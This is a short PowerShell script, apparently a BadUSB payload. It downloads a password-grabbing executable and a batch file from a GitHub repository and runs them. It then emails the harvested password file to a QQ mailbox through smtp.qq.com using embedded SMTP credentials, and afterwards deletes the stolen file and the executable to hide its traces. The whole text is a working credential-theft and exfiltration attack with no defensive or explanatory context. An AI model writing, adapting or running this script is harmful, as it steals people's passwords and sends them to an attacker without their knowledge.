(new-object System.Net.WebClient).DownloadFile('https://github.com/1971521902/badUSB/GetPass.rar','D:\Get.exe');

(new-object System.Net.WebClient).DownloadFile('https://github.com/1971521902/badUSB/Command.rar','D:\Command.bat');

D:\Command.bat;
$SMTPServer = 'smtp.qq.com'

$SMTPInfo = New-Object Net.Mail.SmtpClient($SmtpServer, 587)

$SMTPInfo.EnableSsl = $true 

$SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('1921521902@qq.com', 'olawgxxxxxxx');

$ReportEmail = New-Object System.Net.Mail.MailMessage

$ReportEmail.From = '1921521902@qq.com'

$ReportEmail.To.Add('1921521902@qq.com')

$ReportEmail.Subject = 'GetPass'

$ReportEmail.Body = 'GetPass_text'  

$ReportEmail.Attachments.Add('D:\GetPass.txt')
$SMTPInfo.Timeout = 1000000
$SMTPInfo.Send($ReportEmail)
$ReportEmail.Attachments.Dispose()

remove-item 'D:\GetPass.txt'

remove-item 'D:\Get.exe'
